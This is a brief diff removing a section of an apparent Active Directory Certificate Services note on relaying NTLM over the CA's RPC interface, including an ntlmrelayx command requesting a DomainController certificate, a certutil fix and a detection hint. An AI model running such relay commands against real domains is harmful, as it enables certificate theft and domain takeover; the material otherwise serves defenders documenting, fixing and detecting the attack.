@@ -21,16 +21,3 @@ The CA RPC interface does **not enforce packet integrity**. Relay NTLM over **RP
 
 ### Commands
 ```bash
-# ── Relay over RPC ───────────────────────────────────────────────────
-ntlmrelayx.py -t rpc://10.10.10.20 -rpc-mode ICPR \
-  -smb2support --adcs --template DomainController
-
-# ── Fix: enforce encrypted RPC ───────────────────────────────────────
-certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
-# Restart CertSvc.
-```
-
-### Detection
-NTLM on CA RPC (TCP 135 → high port); **4886** issued to a non-requester.
-
----
